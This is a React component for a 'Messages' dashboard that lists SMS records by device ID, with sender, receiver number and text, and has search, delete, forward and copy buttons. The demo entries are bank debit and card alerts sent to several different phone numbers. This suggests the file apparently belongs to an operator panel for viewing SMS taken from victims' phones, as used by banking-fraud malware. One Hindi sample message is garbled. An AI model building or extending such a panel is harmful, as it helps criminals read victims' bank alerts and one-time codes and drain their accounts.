import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ArrowLeft, Search as SearchIcon, Trash2, RotateCw, Copy, Send } from "lucide-react";

interface Message {
  deviceId: string;
  dataId: string;
  dateCreated: string;
  sender: string;
  receiver: string;
  text: string;
}

const Messages = () => {
  const navigate = useNavigate();
  const [searchQuery, setSearchQuery] = useState("");

  const demoMessages: Message[] = [
    {
      deviceId: "3a85",
      dataId: "flMi",
      dateCreated: "20-11-2025 13:21:59",
      sender: "BT-IOBCHN-S",
      receiver: "919492657565",
      text: "Your a/c XXXXX04 debited for payee PRAJAPATHI PINKI for Rs. 40.00 on 2025-11-20, ref 968391643973.If not you, report to your bank immediately-IOB.",
    },
    {
      deviceId: "7b9e",
      dataId: "Mw-p",
      dateCreated: "20-11-2025 13:21:58",
      sender: "AX-HDFC",
      receiver: "919876543210",
      text: "Your HDFC Bank Card ending 9876 has been used for Rs.1,250.00 at AMAZON on 20-11-2025. If not done by you, call on 18002586161.",
    },
    {
      deviceId: "20e9",
      dataId: "KmHH",
      dateCreated: "20-11-2025 13:46:10",
      sender: "JD-HHFHOM-S",
      receiver: "919896791944",
      text: "प्रिय ग्राहक, Hinduja Housing Finance को नहीं पहुंची/मेली द्वारा किए गए किसी भी भुगतान के लिए, कृपया केवल अधिकृत मानाशी द्वारा बताई गई स्वीकार करें। हम अपने ग्राहकों को हाम करना चाहते हैं कि हमें हर तीन महीने में देखें।",
    },
    {
      deviceId: "3e08",
      dataId: "DCHJ",
      dateCreated: "20-11-2025 14:12:33",
      sender: "VM-ICICI",
      receiver: "919123456789",
      text: "Rs.2500 debited from your A/c XX1234 on 20-11-25. Available balance: Rs.45,678.90. For queries, call 18001080.",
    },
  ];

  const filteredMessages = demoMessages.filter(msg =>
    msg.deviceId.toLowerCase().includes(searchQuery.toLowerCase()) ||
    msg.dataId.toLowerCase().includes(searchQuery.toLowerCase()) ||
    msg.text.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-destructive px-6 py-4 flex items-center justify-between">
        <div className="flex items-center gap-4">
          <Button 
            variant="ghost" 
            size="icon"
            onClick={() => navigate("/")}
            className="text-destructive-foreground hover:bg-destructive-foreground/10"
          >
            <ArrowLeft className="w-5 h-5" />
          </Button>
          <h1 className="text-xl font-bold text-destructive-foreground">
            Messages (Total: {demoMessages.length})
          </h1>
        </div>
        <div className="flex gap-2">
          <Button variant="ghost" size="icon" className="text-destructive-foreground hover:bg-destructive-foreground/10">
            <Trash2 className="w-5 h-5" />
          </Button>
          <Button variant="ghost" size="icon" className="text-destructive-foreground hover:bg-destructive-foreground/10">
            <RotateCw className="w-5 h-5" />
          </Button>
        </div>
      </header>

      <div className="container mx-auto px-4 py-6 max-w-2xl">
        {/* Search Bar */}
        <div className="mb-6">
          <Input
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Enter your query i.e Device ID"
            className="mb-4 bg-card"
          />
          <div className="grid grid-cols-3 gap-3">
            <Button className="bg-green-600 hover:bg-green-700">
              <SearchIcon className="w-4 h-4 mr-2" />
              Search
            </Button>
            <Button 
              variant="secondary" 
              onClick={() => setSearchQuery("")}
              className="bg-orange-600 hover:bg-orange-700 text-white"
            >
              Clear
            </Button>
            <Button 
              variant="secondary"
              onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
              className="bg-purple-600 hover:bg-purple-700 text-white"
            >
              Goto Top
            </Button>
          </div>
        </div>

        {/* Messages List */}
        <div className="space-y-4">
          {filteredMessages.map((msg, index) => (
            <Card key={index} className="border-border/50 overflow-hidden">
              <CardContent className="p-4 space-y-2">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm font-semibold text-foreground">Device ID:</p>
                    <p className="text-foreground">{msg.deviceId}</p>
                  </div>
                  <Button variant="ghost" size="icon" className="text-destructive hover:text-destructive">
                    <Trash2 className="w-4 h-4" />
                  </Button>
                </div>

                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm font-semibold text-foreground">Data ID:</p>
                    <p className="text-foreground">{msg.dataId}</p>
                  </div>
                  <Button variant="ghost" size="icon" className="text-primary">
                    <Send className="w-4 h-4" />
                  </Button>
                </div>

                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm font-semibold text-foreground">Date Created:</p>
                    <p className="text-foreground">{msg.dateCreated}</p>
                  </div>
                  <Button variant="ghost" size="icon" className="text-orange-500">
                    <Copy className="w-4 h-4" />
                  </Button>
                </div>

                <div>
                  <p className="text-sm font-semibold text-foreground">Sender:</p>
                  <p className="text-foreground">{msg.sender}</p>
                </div>

                <div>
                  <p className="text-sm font-semibold text-foreground">Receiver:</p>
                  <p className="text-foreground">{msg.receiver}</p>
                </div>

                <div>
                  <p className="text-sm font-semibold text-foreground">Text:</p>
                  <p className="text-foreground text-sm">{msg.text}</p>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      </div>
    </div>
  );
};

export default Messages;
